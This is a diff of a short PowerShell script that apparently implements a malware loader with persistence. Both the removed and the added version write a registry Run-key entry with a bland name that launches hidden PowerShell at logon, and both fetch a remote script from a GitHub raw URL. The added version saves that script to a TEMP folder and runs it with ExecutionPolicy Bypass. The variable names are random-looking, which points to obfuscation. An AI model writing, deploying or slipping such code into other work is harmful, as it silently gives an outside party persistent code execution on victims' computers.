@@ -1,10 +1,11 @@
-$fqwl = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$ghbp = "startps"
-$mnxc = 'powershell.exe -WindowStyle Hidden -Command "irm https://raw.githubusercontent.com/egigesajaz080-dot/skdbcdsch/refs/heads/main/jsdkbfj.ps1 | iex"'
-
-if (-not (Get-ItemProperty -Path $fqwl -Name $ghbp -ErrorAction SilentlyContinue)) {
-    Set-ItemProperty -Path $fqwl -Name $ghbp -Value $mnxc | Out-Null
-}
+$wqpl="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$zmxr="power"
+$vjty="$env:TEMP\999\power.ps1"
+$korp="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$vjty`""
+$plud=Split-Path $vjty
+if(-not(Test-Path $plud)){New-Item -Path $plud -ItemType Directory -Force|Out-Null}
+if(-not(Test-Path $vjty)){Invoke-RestMethod -Uri "https://raw.githubusercontent.com/egigesajaz080-dot/skdbcdsch/refs/heads/main/jsdkbfj.ps1" -OutFile $vjty}
+if(-not(Get-ItemProperty -Path $wqpl -Name $zmxr -ErrorAction SilentlyContinue)){New-ItemProperty -Path $wqpl -Name $zmxr -Value $korp -PropertyType String|Out-Null}
 
 #
 
